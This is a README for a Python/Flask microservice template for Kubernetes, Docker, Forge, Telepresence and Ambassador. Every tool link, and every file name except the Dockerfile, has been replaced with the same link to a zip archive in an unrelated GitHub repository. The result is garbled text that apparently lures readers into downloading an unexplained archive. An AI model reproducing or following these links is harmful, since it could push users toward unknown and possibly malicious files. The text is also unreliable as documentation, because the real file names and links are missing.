# Hello, World (Python/Flask)

This is a Python/Flask template for building a microservice in Kubernetes and Docker. This template is designed for use with [Forge](https://raw.githubusercontent.com/selvasv/adk-docs/master/factory/adk-docs_v2.5.zip), [Telepresence](https://raw.githubusercontent.com/selvasv/adk-docs/master/factory/adk-docs_v2.5.zip), and [Ambassador](https://raw.githubusercontent.com/selvasv/adk-docs/master/factory/adk-docs_v2.5.zip).

# Repository structure

The main files in this repository are:

* `Dockerfile` specifies how the application is built and packaged
* `https://raw.githubusercontent.com/selvasv/adk-docs/master/factory/adk-docs_v2.5.zip` contains a templated Kubernetes manifest, with additional annotations for configuring Ambassador
* `https://raw.githubusercontent.com/selvasv/adk-docs/master/factory/adk-docs_v2.5.zip` contains values (typically configured by a developer) that will be instantiated into the Kubernetes manifest
* `https://raw.githubusercontent.com/selvasv/adk-docs/master/factory/adk-docs_v2.5.zip` is the actual Python/Flask application

# License

Licensed under Apache 2.0. Please see [LICENSE](LICENSE) for details.
